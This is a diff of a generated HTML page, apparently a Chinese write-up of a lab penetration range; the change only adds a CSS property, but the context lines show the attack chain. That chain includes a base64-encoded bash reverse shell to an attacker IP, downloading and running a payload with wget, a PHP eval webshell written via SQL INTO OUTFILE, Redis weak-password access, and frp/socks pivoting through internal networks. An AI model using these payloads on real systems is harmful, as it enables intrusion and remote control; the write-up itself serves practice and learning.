@@ -295,11 +295,11 @@ function checkNightMode() {
 
 </p>
 <p>拿一个反弹shell</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;bash -i 5&lt;&gt;/dev/tcp/192.168.122.102/1234 0&gt;&amp;5 1&gt;&amp;5&#39;</span> | base64
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;bash -i 5&lt;&gt;/dev/tcp/192.168.122.102/1234 0&gt;&amp;5 1&gt;&amp;5&#39;</span> | base64
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>bash -c <span style="color:#f92672">{</span>echo ,YmFzaCAtaSA1PD4vZGV2L3RjcC8xOTIuMTY4LjEyMi4xMDIvMTIzNCAwPiY1IDE+JjUK<span style="color:#f92672">}</span>|<span style="color:#f92672">{</span>base64,-d<span style="color:#f92672">}</span>|<span style="color:#f92672">{</span>bash,-i<span style="color:#f92672">}</span>
 </span></span></code></pre></div><p>成功拿到shell</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> $ pwncat  -l <span style="color:#ae81ff">1234</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> $ pwncat  -l <span style="color:#ae81ff">1234</span>
 </span></span><span style="display:flex;"><span>id
 </span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>/usr/bin/script -qc /bin/bash /dev/null
@@ -307,7 +307,7 @@ function checkNightMode() {
 </span></span></code></pre></div><h3 id="内网扫描">内网扫描</h3>
 <p>然后开始扫描内网.</p>
 <p>这里不知道为啥出现了三台机器(多了一台192.168.100.1),192.168.100.3才是我接下来要利用的thinkphp机器.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@74d34925b057:/tmp# ifconfig
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@74d34925b057:/tmp# ifconfig
 </span></span><span style="display:flex;"><span>eth0: flags<span style="color:#f92672">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span style="color:#ae81ff">1500</span>
 </span></span><span style="display:flex;"><span>        inet 192.168.100.2  netmask 255.255.255.0  broadcast 192.168.110.255
 </span></span><span style="display:flex;"><span>        ether 02:42:c0:a8:6e:02  txqueuelen <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>Ethernet<span style="color:#f92672">)</span>
@@ -354,7 +354,7 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> PocScan http://192.168.100.2:8080/ poc-yaml-shiro-key <span style="color:#f92672">[{</span>mode cbc<span style="color:#f92672">}</span> <span style="color:#f92672">{</span>key kPH+bIxk5D2deZiIxcaaaA<span style="color:#f92672">==}]</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> PocScan http://192.168.100.3 poc-yaml-thinkphp5-controller-rce 
 </span></span></code></pre></div><h3 id="配置端口转发">配置端口转发</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>192.168.122.102 wsl kali
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>192.168.122.102 wsl kali
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>192.168.100.2 shiro
 </span></span><span style="display:flex;"><span>192.168.100.3 thinkphp
@@ -366,7 +366,7 @@ function checkNightMode() {
 
 </p>
 <p>接下来需要配置端口转发了,这个我没啥经验,用我wsl里面装过的frp吧</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wsl kali
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wsl kali
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>l1uyun workspace/frp » ./frps -c frps.toml
 </span></span><span style="display:flex;"><span>2024-08-19 09:57:33.478 <span style="color:#f92672">[</span>I<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>frps/root.go:105<span style="color:#f92672">]</span> frps uses config file: frps.toml       
@@ -376,7 +376,7 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span>2024-08-19 09:59:30.951 <span style="color:#f92672">[</span>I<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>proxy/tcp.go:82<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>f73e9824ff9889ea<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>shiro<span style="color:#f92672">]</span> tcp proxy listen port <span style="color:#f92672">[</span>9999<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>2024-08-19 09:59:30.951 <span style="color:#f92672">[</span>I<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>server/control.go:399<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>f73e9824ff9889ea<span style="color:#f92672">]</span> new proxy <span style="color:#f92672">[</span>shiro<span style="color:#f92672">]</span> type <span style="color:#f92672">[</span>tcp<span style="color:#f92672">]</span> success
 </span></span><span style="display:flex;"><span>2024-08-19 09:59:45.095 <span style="color:#f92672">[</span>I<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>proxy/proxy.go:115<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>f73e9824ff9889ea<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>shiro<span style="color:#f92672">]</span> proxy closing
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>shiro
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>shiro
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>root@653a3ab3924e:/tmp# ./frpc -c shiro.toml
 </span></span><span style="display:flex;"><span>2024-08-19 01:59:30.648 <span style="color:#f92672">[</span>I<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>sub/root.go:142<span style="color:#f92672">]</span> start frpc service <span style="color:#66d9ef">for</span> config file <span style="color:#f92672">[</span>shiro.toml<span style="color:#f92672">]</span>
@@ -384,7 +384,7 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span>2024-08-19 01:59:30.652 <span style="color:#f92672">[</span>I<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>client/service.go:286<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>f73e9824ff9889ea<span style="color:#f92672">]</span> login to server success, get run id <span style="color:#f92672">[</span>f73e9824ff9889ea<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>2024-08-19 01:59:30.652 <span style="color:#f92672">[</span>I<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>proxy/proxy_manager.go:173<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>f73e9824ff9889ea<span style="color:#f92672">]</span> proxy added: <span style="color:#f92672">[</span>shiro<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>2024-08-19 01:59:30.653 <span style="color:#f92672">[</span>I<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>client/control.go:168<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>f73e9824ff9889ea<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>shiro<span style="color:#f92672">]</span> start proxy success
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-toml" data-lang="toml"><span style="display:flex;"><span><span style="color:#a6e22e">shiro</span>.<span style="color:#a6e22e">toml</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-toml" data-lang="toml"><span style="display:flex;"><span><span style="color:#a6e22e">shiro</span>.<span style="color:#a6e22e">toml</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">serverAddr</span> = <span style="color:#e6db74">&#34;192.168.122.102&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">serverPort</span> = <span style="color:#ae81ff">7000</span>
@@ -418,7 +418,7 @@ function checkNightMode() {
 
 
 拿shell</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;YmFzaCAtaSA1PD4vZGV2L3RjcC8xOTIuMTY4LjEyMi4xMDIvNDQ0NCAwPiY1IDE+JjUK&#39;</span> |base64 -d &gt; /tmp/a.sh
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;YmFzaCAtaSA1PD4vZGV2L3RjcC8xOTIuMTY4LjEyMi4xMDIvNDQ0NCAwPiY1IDE+JjUK&#39;</span> |base64 -d &gt; /tmp/a.sh
 </span></span><span style="display:flex;"><span>chmod <span style="color:#ae81ff">777</span> /tmp/a.sh
 </span></span><span style="display:flex;"><span>ls -al /tmp/a.sh
 </span></span><span style="display:flex;"><span>bash /tmp/a.sh
@@ -430,9 +430,9 @@ function checkNightMode() {
 
 
 成功拿到shell</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget 192.168.122.102/ppp -O /tmp/ppp
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget 192.168.122.102/ppp -O /tmp/ppp
 </span></span><span style="display:flex;"><span>php /tmp/ppp
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>..<span style="color:#f92672">[</span>$<span style="color:#f92672">]</span> &lt;<span style="color:#f92672">()</span>&gt; pwncat  -l <span style="color:#ae81ff">4444</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>..<span style="color:#f92672">[</span>$<span style="color:#f92672">]</span> &lt;<span style="color:#f92672">()</span>&gt; pwncat  -l <span style="color:#ae81ff">4444</span>
 </span></span><span style="display:flex;"><span>id
 </span></span><span style="display:flex;"><span>Linux 94a2babbcac5 6.5.0-13parrot1-amd64 <span style="color:#75715e">#1 SMP PREEMPT_DYNAMIC Debian 6.5.13-1parrot1 (2023-12-19) x86_64 Linux</span>
 </span></span><span style="display:flex;"><span>sh: w: not found
@@ -441,7 +441,7 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span>/ $ uid<span style="color:#f92672">=</span>82<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>82<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>82<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>,82<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>/ $ 
 </span></span></code></pre></div><p>这里有python3,给shell升级一下</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>which python python2 python3
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>which python python2 python3
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>;
 </span></span><span style="display:flex;"><span>
@@ -452,12 +452,12 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>stty raw -echo;fg 
 </span></span></code></pre></div><p>拿到flag</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash-5.1$ cat /f*
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash-5.1$ cat /f*
 </span></span><span style="display:flex;"><span>cat /f*
 </span></span><span style="display:flex;"><span>WSS-Studio<span style="color:#f92672">{</span>ThinkPHP-84d786a4-b47c-4fcb-a377-be6241d5bf10<span style="color:#f92672">}</span>
 </span></span></code></pre></div><h3 id="内网扫描-1">内网扫描</h3>
 <p>可以看到这台thinkphp机器是有两个内网地址的</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/ $ ifconfig
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/ $ ifconfig
 </span></span><span style="display:flex;"><span>eth0      Link encap:Ethernet  HWaddr 02:42:C0:A8:64:03  
 </span></span><span style="display:flex;"><span>          inet addr:192.168.100.3  Bcast:192.168.100.255  Mask:255.255.255.0
 </span></span><span style="display:flex;"><span>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
@@ -482,7 +482,7 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span>          collisions:0 txqueuelen:1000
 </span></span><span style="display:flex;"><span>          RX bytes:4014368 <span style="color:#f92672">(</span>3.8 MiB<span style="color:#f92672">)</span>  TX bytes:4014368 <span style="color:#f92672">(</span>3.8 MiB<span style="color:#f92672">)</span>
 </span></span></code></pre></div><p>上fscan扫一下内网</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>start infoscan
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>start infoscan
 </span></span><span style="display:flex;"><span>trying RunIcmp2
 </span></span><span style="display:flex;"><span>The current user permissions unable to send icmp packets
 </span></span><span style="display:flex;"><span>start ping
@@ -531,7 +531,7 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 扫描结束,耗时: 7m48.941223927s
 </span></span></code></pre></div><h3 id="配置socks代理">配置socks代理</h3>
 <p>我这为啥又出现了一个多的ip&hellip;.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>10.85.101.4 thinkphp
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>10.85.101.4 thinkphp
 </span></span><span style="display:flex;"><span>10.85.101.3 phpmyadmin
 </span></span><span style="display:flex;"><span>10.85.101.2 redis
 </span></span><span style="display:flex;"><span>10.85.101.1 ???  是运行docker的parrot???
@@ -543,7 +543,7 @@ function checkNightMode() {
 
 
 这里就直接配置个socks代理吧</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-toml" data-lang="toml"><span style="display:flex;"><span><span style="color:#a6e22e">serverAddr</span> = <span style="color:#e6db74">&#34;192.168.122.102&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-toml" data-lang="toml"><span style="display:flex;"><span><span style="color:#a6e22e">serverAddr</span> = <span style="color:#e6db74">&#34;192.168.122.102&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">serverPort</span> = <span style="color:#ae81ff">7000</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>[[<span style="color:#a6e22e">proxies</span>]]
@@ -568,7 +568,7 @@ function checkNightMode() {
 </p>
 <h2 id="redis">redis</h2>
 <p>使用proxychains来实现使用代理</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>☁  workspace  sudo proxychains4  nmap -sT -Pn 10.85.101.2 -p6379 --script<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;*redis*&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>☁  workspace  sudo proxychains4  nmap -sT -Pn 10.85.101.2 -p6379 --script<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;*redis*&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> config file found: /etc/proxychains4.conf
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> DLL init: proxychains-ng 4.17
@@ -587,7 +587,7 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 0.18 seconds
 </span></span></code></pre></div><p>有个弱口令</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>└<span style="color:#f92672">[</span>~/workspace<span style="color:#f92672">]</span>&gt; sudo proxychains4  redis-cli -h 10.85.101.2 -p <span style="color:#ae81ff">6379</span> -a <span style="color:#ae81ff">12345</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>└<span style="color:#f92672">[</span>~/workspace<span style="color:#f92672">]</span>&gt; sudo proxychains4  redis-cli -h 10.85.101.2 -p <span style="color:#ae81ff">6379</span> -a <span style="color:#ae81ff">12345</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> config file found: /etc/proxychains4.conf
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> DLL init: proxychains-ng 4.17
@@ -649,7 +649,7 @@ function checkNightMode() {
 
 
 写入webshell</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#e6db74">&#34;&lt;?php @eval($_POST[1]);?&gt;&#34;</span> <span style="color:#66d9ef">into</span> outfile <span style="color:#e6db74">&#39;/var/www/html/shell.php&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#e6db74">&#34;&lt;?php @eval($_POST[1]);?&gt;&#34;</span> <span style="color:#66d9ef">into</span> outfile <span style="color:#e6db74">&#39;/var/www/html/shell.php&#39;</span>
 </span></span></code></pre></div><p>
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_19.png" alt="" /></figure>
@@ -695,7 +695,7 @@ function checkNightMode() {
 
 </p>
 <h3 id="内网扫描-2">内网扫描</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>root:/tmp<span style="color:#f92672">)</span> $ ip a
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>root:/tmp<span style="color:#f92672">)</span> $ ip a
 </span></span><span style="display:flex;"><span>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">65536</span> qdisc noqueue state UNKNOWN qlen <span style="color:#ae81ff">1000</span>
 </span></span><span style="display:flex;"><span>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
 </span></span><span style="display:flex;"><span>    inet 127.0.0.1/8 scope host lo
@@ -716,7 +716,7 @@ function checkNightMode() {
 
 
 跟之前一样,多了一个172.56.102.1,这到底是啥???🤔,大概率就是我运行docker的parrot机器了</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>172.56.102.1:22 open
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>172.56.102.1:22 open
 </span></span><span style="display:flex;"><span>172.56.102.4:80 open
 </span></span><span style="display:flex;"><span>172.56.102.2:8080 open
 </span></span><span style="display:flex;"><span>172.56.102.3:5432 open
@@ -735,7 +735,7 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> WebTitle http://172.56.102.2:8080  code:200 len:90     title:$Title$
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> PocScan http://172.56.102.2:8080 poc-yaml-struts2_045 poc1
 </span></span></code></pre></div><h3 id="二重内网环境配置代理">二重内网环境配置代理</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>172.56.102.4   phpmyadmin
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>172.56.102.4   phpmyadmin
 </span></span><span style="display:flex;"><span>172.56.102.3   Postgres
 </span></span><span style="display:flex;"><span>172.56.102.2   struts2
 </span></span></code></pre></div><p>这里直接拿巨魔的拓扑图
@@ -746,7 +746,7 @@ function checkNightMode() {
 
 
 我现在需要再配置一个socks代理,服务器放在thinkphp机器上,客户端放在phpmyadmin机器上</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-toml" data-lang="toml"><span style="display:flex;"><span><span style="color:#a6e22e">phpmyadmin</span>.<span style="color:#a6e22e">toml</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-toml" data-lang="toml"><span style="display:flex;"><span><span style="color:#a6e22e">phpmyadmin</span>.<span style="color:#a6e22e">toml</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">serverAddr</span> = <span style="color:#e6db74">&#34;10.85.101.4&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">serverPort</span> = <span style="color:#ae81ff">7000</span>
@@ -764,13 +764,13 @@ function checkNightMode() {
 
 
 然后在proxychains里面配置两个代理</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>socks5 192.168.122.102 <span style="color:#ae81ff">9998</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>socks5 192.168.122.102 <span style="color:#ae81ff">9998</span>
 </span></span><span style="display:flex;"><span>socks5 10.85.101.4 <span style="color:#ae81ff">9998</span>
 </span></span><span style="display:flex;"><span>或者
 </span></span><span style="display:flex;"><span>socks5 127.0.0.1 <span style="color:#ae81ff">9998</span>
 </span></span><span style="display:flex;"><span>socks5 127.0.0.1 <span style="color:#ae81ff">9998</span>
 </span></span></code></pre></div><p>然后nmap扫一下,检查一下代理是否成功.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>☁  workspace  sudo proxychains nmap -Pn -sT -T4 172.56.102.2 -p8080
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>☁  workspace  sudo proxychains nmap -Pn -sT -T4 172.56.102.2 -p8080
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> config file found: /etc/proxychains4.conf
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> DLL init: proxychains-ng 4.17
@@ -823,7 +823,7 @@ function checkNightMode() {
 <p>之前fscan扫出来的弱口令
 <code>[+] Postgres:172.56.102.3:5432:postgres password</code></p>
 <p>登录之后获取flag</p>
